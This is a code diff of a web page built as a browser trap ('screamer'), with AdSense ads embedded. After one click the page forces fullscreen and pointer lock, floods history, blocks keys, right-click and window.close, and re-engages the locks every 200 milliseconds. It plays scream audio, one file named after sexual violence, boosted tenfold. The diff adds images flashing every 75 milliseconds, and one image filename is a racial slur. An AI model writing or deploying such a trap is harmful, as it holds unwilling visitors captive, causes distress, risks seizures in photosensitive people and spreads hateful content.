@@ -13,21 +13,18 @@
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
     <!-- PUT THE ADSENSE SCRIPT HERE -->
     <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3026390331916120"
          crossorigin="anonymous"></script>
-
 <style>
-* { 
-    padding: 0; 
-    margin: 0; 
+* {
+    padding: 0;
+    margin: 0;
     -webkit-user-select: none;
     -moz-user-select: none;
     -ms-user-select: none;
     user-select: none;
 }
-
 body, html {
     overflow: hidden;
     height: 100%;
@@ -35,7 +32,6 @@ body, html {
     background: #000;
     cursor: none;
 }
-
 .video-container {
     position: fixed;
     top: 50%;
@@ -47,14 +43,12 @@ body, html {
     justify-content: space-between;
     z-index: 1000;
 }
-
 .video-wrapper {
     width: 640px;
     height: 480px;
     position: relative;
     flex-shrink: 0;
 }
-
 /* Style both video and img elements inside the wrapper */
 .video-wrapper video,
 .video-wrapper img {
@@ -64,14 +58,12 @@ body, html {
     position: absolute;
     top: 0;
 }
-
 .video-divider {
     width: 2px;
     height: 480px;
     background: red;
     flex-shrink: 0;
 }
-
 .click-overlay {
     position: fixed;
     top: 0;
@@ -84,7 +76,6 @@ body, html {
     justify-content: center;
     align-items: center;
 }
-
 .click-overlay button {
     padding: 20px 40px;
     font-size: 20px;
@@ -94,7 +85,6 @@ body, html {
     border-radius: 0;
     cursor: pointer;
 }
-
 .black-screen {
     background-color: black;
     position: fixed;
@@ -104,7 +94,6 @@ body, html {
     height: 100vh;
     z-index: 9999998;
 }
-
 .backg {
     position: fixed;
     top: 0;
@@ -113,27 +102,43 @@ body, html {
     height: 100%;
     z-index: 1;
 }
-
 .backg img {
     width: 100%;
     height: 100%;
     object-fit: cover;
     opacity: 0.3;
 }
+
+/* NEW: Flashing images layer */
+.flash-layer {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 800; /* Below videos (1000) but above background (1) */
+    pointer-events: none;
+    display: none;
+    overflow: hidden;
+}
+.flash-img {
+    position: absolute;
+    max-width: 40%;
+    max-height: 40%;
+    opacity: 0;
+    filter: brightness(1.3);
+}
 </style>
 </head>
 <body>
-
 <!-- Click anywhere on overlay to start (button is just visual) -->
 <div class="click-overlay" id="startOverlay">
     <button>ENTER</button>
 </div>
 <div class="black-screen"></div>
-
 <audio id="shart" preload="auto" loop src="scream.mp3"></audio>
 <audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
 <audio id="shart3" preload="auto" loop src="rape.mp3"></audio>
-
 <div class="video-container">
     <!-- Third element: wads.gif (as an image, not a video) -->
     <div class="video-wrapper">
@@ -149,6 +154,17 @@ body, html {
     </div>
 </div>
 
+<!-- NEW: Flashing images (below videos, above background) -->
+<div class="flash-layer" id="flashLayer">
+    <img id="img1" class="flash-img" src="img1.gif" alt="">
+    <img id="img2" class="flash-img" src="img2.gif" alt="">
+    <img id="img3" class="flash-img" src="img3.gif" alt="">
+    <img id="img4" class="flash-img" src="img4.gif" alt="">
+    <img id="img5" class="flash-img" src="img5.gif" alt="">
+    <img id="img6" class="flash-img" src="img6.gif" alt="">
+    <img id="img7" class="flash-img" src="img7.gif" alt="">
+</div>
+
 <div class="backg"><img src="naggars.gif"></div>
 
 <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
@@ -157,18 +173,15 @@ body, html {
     let hasTriggered = false;
     const ORIGINAL_WIDTH = 640;
     const ORIGINAL_HEIGHT = 480;
-
     // --- AUDIO BOOST (Web Audio API) ---
     let audioContext;
     let gainNode;
     const mediaElements = [];
-
     function initAudioBoost() {
         audioContext = new (window.AudioContext || window.webkitAudioContext)();
         gainNode = audioContext.createGain();
         gainNode.gain.value = 10; // 10x volume
         gainNode.connect(audioContext.destination);
-
         // Connect all audio elements
         const audioIds = ['shart', 'shart2', 'shart3'];
         audioIds.forEach(id => {
@@ -181,7 +194,6 @@ body, html {
                 el.muted = false;
             }
         });
-
         // Connect video elements only (wads is an image, so exclude it)
         const videoIds = ['fart', 'ronnie'];
         videoIds.forEach(id => {
@@ -195,7 +207,6 @@ body, html {
             }
         });
     }
-
     function playAllMedia() {
         if (audioContext && audioContext.state === 'suspended') {
             audioContext.resume();
@@ -213,7 +224,6 @@ body, html {
             }
         });
     }
-
     // --- FULLSCREEN LOCK ---
     function attemptFullscreen() {
         const elem = document.documentElement;
@@ -222,28 +232,24 @@ body, html {
         else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
         else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
     }
-
     // --- POINTER LOCK ---
     function lockPointer() {
         if (document.body.requestPointerLock) {
             document.body.requestPointerLock();
         }
     }
-
     // --- HISTORY FLOOD ---
     function floodHistory() {
         for (let i = 0; i < 20; i++) {
             history.pushState(null, null, location.href);
         }
     }
-
     // --- KEY BLOCKING ---
     function blockKeys(e) {
         e.preventDefault();
         e.stopPropagation();
         return false;
     }
-
     // --- RE-ENGAGE LOCKS ---
     function reengageLocks() {
         if (hasTriggered) {
@@ -256,64 +262,70 @@ body, html {
         }
     }
 
+    // === NEW: START FLASHING ===
+    function startFlashing() {
+        const flashLayer = document.getElementById('flashLayer');
+        const images = document.querySelectorAll('.flash-img');
+        flashLayer.style.display = 'block';
+
+        setInterval(() => {
+            images.forEach(img => {
+                const x = Math.random() * 75 + 12.5;
+                const y = Math.random() * 75 + 12.5;
+                img.style.left = x + '%';
+                img.style.top = y + '%';
+                img.style.opacity = Math.random() > 0.35 ? '1' : '0.1';
+                img.style.transform = `scale(${0.7 + Math.random() * 0.8})`;
+            });
+        }, 75);
+    }
+
     // --- START FUNCTION ---
     window.startExperience = function() {
         if (hasTriggered) return;
         hasTriggered = true;
-
         const overlay = document.getElementById('startOverlay');
         const blackScreen = document.querySelector('.black-screen');
         if (overlay) overlay.style.display = 'none';
         if (blackScreen) blackScreen.style.display = 'none';
-
         floodHistory();
         initAudioBoost();
         playAllMedia();
         attemptFullscreen();
         lockPointer();
-
+        startFlashing();                    // ← Flashing starts here
         setInterval(reengageLocks, 200);
-
         const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
         events.forEach(eventType => {
             document.addEventListener(eventType, reengageLocks, true);
         });
-
         document.addEventListener('fullscreenchange', reengageLocks);
         document.addEventListener('webkitfullscreenchange', reengageLocks);
         document.addEventListener('mozfullscreenchange', reengageLocks);
         document.addEventListener('MSFullscreenChange', reengageLocks);
-
         document.addEventListener('pointerlockchange', reengageLocks);
         document.addEventListener('mozpointerlockchange', reengageLocks);
         document.addEventListener('webkitpointerlockchange', reengageLocks);
-
         document.addEventListener('keydown', blockKeys, true);
         document.addEventListener('keyup', blockKeys, true);
         document.addEventListener('keypress', blockKeys, true);
     };
-
     document.getElementById('startOverlay').addEventListener('click', startExperience);
-
     document.addEventListener('contextmenu', e => e.preventDefault(), true);
     document.addEventListener('dragstart', e => e.preventDefault(), true);
     document.addEventListener('selectstart', e => e.preventDefault(), true);
-
     window.onbeforeunload = function() {
         return "Are you absolutely sure you want to leave?";
     };
-
     window.close = function() {
         console.warn('Nice try.');
     };
-
     window.onpopstate = function() {
         if (hasTriggered) {
             floodHistory();
             reengageLocks();
         }
     };
-
     // No resize function needed – container sizes automatically
 })();
 </script>
